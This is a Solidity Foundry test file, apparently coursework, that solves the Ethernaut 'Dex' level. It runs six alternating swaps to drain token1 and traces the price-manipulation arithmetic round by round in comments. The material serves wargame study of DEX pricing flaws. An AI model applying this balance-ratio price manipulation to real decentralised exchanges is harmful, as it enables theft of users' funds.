// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Dex} from "../../src/Week6-7/Fuzzing/EthernautDex1.sol";
import {SwappableToken} from "../../src/Week6-7/Fuzzing/EthernautDex1.sol";

/**
 * ------------------------------------------------------------------------
 * The goal of this level is for you to hack the basic DEX contract below and
 * steal the funds by price manipulation.
 *
 * You will start with 10 tokens of token1 and 10 of token2.
 * The DEX contract starts with 100 of each token.
 *
 * You will be successful in this level if you manage to drain all of at least
 * 1 of the 2 tokens from the contract, and allow the contract to report a "bad"
 * price of the assets.
 * --------------------------------------------------------------------------
 */

//forge test --match-contract EthernautDex1Test -vvvv
contract EthernautDex1Test is Test {
    Dex dexContract;
    SwappableToken token1;
    SwappableToken token2;
    address attacker = address(0xBad);

    function setUp() public {
        dexContract = new Dex();
        token1 = new SwappableToken(address(dexContract), "Token1", "TK1", 1_000_000);
        token2 = new SwappableToken(address(dexContract), "Token2", "TK2", 1_000_000);

        dexContract.setTokens(address(token1), address(token2));
        dexContract.approve(address(dexContract), 1_000_000);

        dexContract.addLiquidity(address(token1), 100);
        dexContract.addLiquidity(address(token2), 100);

        token1.transfer(attacker, 10);
        token2.transfer(attacker, 10);
        dexContract.renounceOwnership();
    }

    function testAttack() public {
        address _token1 = address(token1);
        address _token2 = address(token2);

        vm.startPrank(attacker);
        dexContract.approve(address(dexContract), 1_000_000);

        // Round 1
        dexContract.swap(_token1, _token2, 10);
        // Round 2
        dexContract.swap(_token2, _token1, 20);
        // Round 3
        dexContract.swap(_token1, _token2, 24);
        // Round 4
        dexContract.swap(_token2, _token1, 30);
        // Round 5
        dexContract.swap(_token1, _token2, 41);
        // Round 6
        dexContract.swap(_token2, _token1, 45);

        vm.stopPrank();

        require(token1.balanceOf(address(dexContract)) == 0, "Token 1 not drained from Dex contract");
    }
}

//Exploit:
// The exploit involves draining all of token1 from the Dex contract by swapping back and forth
// between token1 and token2. The exploit works because in `getSwapPrice`, the price is calculated
// based on the current balance of the two tokens in the Dex contract. Due to the proportional nature
// of the price calculation, each swap alters the relative prices of the two tokens. So at each round,
// the token swapped into the Dex contract will have a lower price for subsequent swaps by an increase
// in its supply. Conversely, the token swapped out of the Dex contract will have a higher price for
// subsequent swaps by a decrease in its supply.
//
// By repeatedly swapping back and forth the two tokens, the attacker can exchange a smaller amount
// of token1 for a larger amount of token2, and then exchange that larger amount of token2 for an
// even larger amount of token1. This process repeats until the attacker drains all of token1 from
// the Dex contract.

//Round 1:
//Attacker pre-swap balances: 10, 10
//Dex pre-swap balances: 100, 100
//Swap price for 10 token1 -> token2: 10 * 100 / 100 = 10 token2
//Attacker post-swap balances: 0, 20
//Dex post-swap balances: 110, 90
//
//Round 2:
//Attacker pre-swap balances: 0, 20
//Dex pre-swap balances: 110, 90
//Swap price for 20 token2 -> token1: 20 * 110 / 90 = 24 token1
//Attacker post-swap balances: 24, 0
//Dex post-swap balances: 86, 110
//
//Round 3:
//Attacker pre-swap balances: 24, 0
//Dex pre-swap balances: 86, 110
//Swap price for 24 token1 -> token2: 24 * 110 / 86 = 30 token2
//Attacker post-swap balances: 0, 30
//Dex post-swap balances: 110, 80
//
//Round 4:
//Attacker pre-swap balances: 0, 30
//Dex pre-swap balances: 110, 80
//Swap price for 30 token2 -> token1: 30 * 110 / 80 = 41 token1
//Attacker post-swap balances: 41, 0
//Dex post-swap balances: 69, 110
//
//Round 5:
//Attacker pre-swap balances: 41, 0
//Dex pre-swap balances: 69, 110
//Swap price for 41 token1 -> token2: 41 * 110 / 69 = 65 token2
//Attacker post-swap balances: 0, 65
//Dex post-swap balances: 110, 45
//
//Round 6:
//Attacker pre-swap balances: 0, 65
//Dex pre-swap balances: 110, 45
//Swap price for 65 token2 -> token1: 65 * 110 / 45 = 159 token1
//The Dex contract does not have enough token1 to complete the swap, so the swap reverts here.
//Swap price for 45 token2 -> token1: 45 * 110 / 45 = 110 token1
//Attacker post-swap balances: 110, 0
//Dex post-swap balances: 0, 110
//
//Token 1 drained from Dex contract.
